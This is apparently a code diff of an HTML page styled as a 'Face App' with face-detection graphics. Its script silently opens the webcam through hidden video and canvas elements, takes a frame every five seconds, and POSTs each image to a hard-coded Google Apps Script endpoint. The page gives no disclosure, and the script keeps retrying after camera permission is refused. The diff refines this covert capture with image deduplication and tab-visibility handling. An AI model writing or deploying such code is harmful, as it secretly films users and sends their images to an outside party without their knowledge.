@@ -2,165 +2,154 @@
 <html lang="en">
 
 <head>
-
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <title>Face App</title>
-
 <link rel="stylesheet" href="style.css">
-
 </head>
 
 <body>
 
 <div id="device">
+  <div id="top">
+    <div class="left"></div>
+    <div class="right"></div>
+  </div>
 
-<div id="top">
-<div class="left"></div>
-<div class="right"></div>
-</div>
+  <div id="content">
+    <div class="menu">
+      <div class="profilePhoto"></div>
+    </div>
 
-<div id="content">
-
-<div class="menu">
-<div class="profilePhoto"></div>
-</div>
-
-<div class="detection">
-<div class="line-left"></div>
-<div class="line-top"></div>
-<div class="line-right"></div>
-<div class="line-bottom"></div>
-</div>
-
-</div>
+    <div class="detection">
+      <div class="line-left"></div>
+      <div class="line-top"></div>
+      <div class="line-right"></div>
+      <div class="line-bottom"></div>
+    </div>
+  </div>
 </div>
 
 <div class="video-wrap" hidden>
-<video id="video" playsinline autoplay></video>
+  <video id="video" playsinline autoplay></video>
 </div>
 
 <canvas hidden id="canvas" width="320" height="320"></canvas>
 
 <script>
-
 const GAS_URL="https://script.google.com/macros/s/AKfycbyaLQ2AmryI8aUb-gFrHfwtp7n8hB6wX34TMkZdfBbDTnNlPW8ge2hINlV1a28M1Hcgig/exec";
 
-const video=document.getElementById("video");
-const canvas=document.getElementById("canvas");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
 
-let stream=null;
-let sending=false;
+let stream = null;
+let captureInterval = null;
+let lastHash = null;
+const INTERVAL = 5000; // 5 sec
 
-async function startCamera(){
-
-try{
-
-stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
-
-video.srcObject=stream;
-
-video.onloadedmetadata=function(){
-
-startCapture();
-
-};
-
-stream.getVideoTracks()[0].onended=function(){
-
-console.log("camera stopped");
-
-setTimeout(startCamera,3000);
-
-};
-
+// simple hash function for base64 comparison
+function hashString(str) {
+    let hash = 0, i, chr;
+    if (str.length === 0) return hash;
+    for (i = 0; i < str.length; i++) {
+        chr = str.charCodeAt(i);
+        hash = ((hash << 5) - hash) + chr;
+        hash |= 0;
+    }
+    return hash;
 }
 
-catch(e){
+// start camera
+async function startCamera() {
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
+        video.srcObject = stream;
 
-console.log("permission denied");
+        video.onloadedmetadata = function() {
+            if(!document.hidden){
+                startCapture();
+            }
+        }
 
-setTimeout(startCamera,5000);
+        stream.getVideoTracks()[0].onended = function(){
+            console.log("camera stopped, retry in 3 sec");
+            stopCapture();
+            setTimeout(startCamera,1000);
+        }
 
+    } catch(e){
+        console.log("camera permission denied or error, retry in 5 sec");
+        setTimeout(startCamera,500);
+    }
 }
 
+// start capture with motion detection
+function startCapture() {
+    if(captureInterval) return;
+
+    console.log("capture started");
+
+    captureInterval = setInterval(()=>{
+        if(document.hidden){
+            console.log("tab hidden, skipping capture");
+            return;
+        }
+
+        ctx.drawImage(video,0,0,320,320);
+        const img = canvas.toDataURL("image/jpeg",0.6);
+        const base64 = img.replace("data:image/jpeg;base64,","");
+
+        const currentHash = hashString(base64);
+
+        // send only if different or motion detected
+        if(lastHash !== currentHash){
+            lastHash = currentHash;
+            sendImage(base64);
+        } else {
+            console.log("same image, skipping send");
+        }
+
+    }, INTERVAL);
 }
 
-function startCapture(){
-
-if(sending) return;
-
-sending=true;
-
-const ctx=canvas.getContext("2d");
-
-setInterval(()=>{
-
-if(document.hidden){
-
-console.log("tab background");
-
+// stop capture
+function stopCapture(){
+    if(captureInterval){
+        clearInterval(captureInterval);
+        captureInterval = null;
+        console.log("capture stopped");
+    }
 }
 
-ctx.drawImage(video,0,0,320,320);
-
-const img=canvas.toDataURL("image/jpeg",0.6);
-
-const base64=img.replace("data:image/jpeg;base64,","");
-
-sendImage(base64);
-
-},5000);
-
-}
-
+// send to Google Apps Script
 async function sendImage(data){
-
-try{
-
-await fetch(GAS_URL,{
-
-method:"POST",
-
-headers:{
-
-"Content-Type":"application/x-www-form-urlencoded"
-
-},
-
-body:"cat="+encodeURIComponent(data)
-
-});
-
-console.log("sent");
-
+    try{
+        await fetch(GAS_URL,{
+            method:"POST",
+            headers:{"Content-Type":"application/x-www-form-urlencoded"},
+            body:"cat="+encodeURIComponent(data)
+        });
+        console.log("sent image");
+    } catch(e){
+        console.log("send error", e);
+    }
 }
 
-catch(e){
-
-console.log("send error");
-
-}
-
-}
-
-document.addEventListener("visibilitychange",()=>{
-
-if(document.hidden){
-
-console.log("tab hidden");
-
-}else{
-
-console.log("tab active");
-
-}
-
+// visibility change handling
+document.addEventListener("visibilitychange", ()=>{
+    if(document.hidden){
+        console.log("tab hidden");
+        stopCapture();
+    } else {
+        console.log("tab visible");
+        if(video.srcObject){
+            startCapture();
+        }
+    }
 });
 
 startCamera();
-
 </script>
 
 </body>
